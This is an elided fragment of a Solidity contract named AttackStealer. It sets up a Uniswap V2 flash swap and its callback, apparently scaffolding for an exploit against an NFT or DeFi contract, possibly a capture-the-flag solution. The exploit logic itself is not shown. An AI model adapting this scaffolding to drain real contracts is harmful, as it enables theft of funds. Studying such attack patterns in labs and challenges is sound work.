...
contract AttackStealer is IERC721Receiver {
    ...
    function flashSwap(address _tokenBorrow, uint256 _amount) external {
        ...
        (, bytes memory data_) = factory.call(abi.encodeWithSignature("getPair(address,address)", _tokenBorrow, token));
        address pair = abi.decode(data_, (address));
        require(pair != address(0), "!pair init");

        (, data_) = pair.call(abi.encodeWithSignature("token0()"));
        address token0 = abi.decode(data_, (address));
        (, data_) = pair.call(abi.encodeWithSignature("token1()"));
        address token1 = abi.decode(data_, (address));
        ...
        pair.call(
            abi.encodeWithSignature("swap(uint256,uint256,address,bytes)", amount0Out, amount1Out, address(this), data)
        );
    }

    // Flash Swap callback from UniSwap
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        (, bytes memory data_) = msg.sender.call(abi.encodeWithSignature("token0()"));
        address token0 = abi.decode(data_, (address));
        (, data_) = msg.sender.call(abi.encodeWithSignature("token1()"));
        address token1 = abi.decode(data_, (address));
        (, data_) = factory.call(abi.encodeWithSignature("getPair(address,address)", token0, token1));
        address pair = abi.decode(data_, (address));
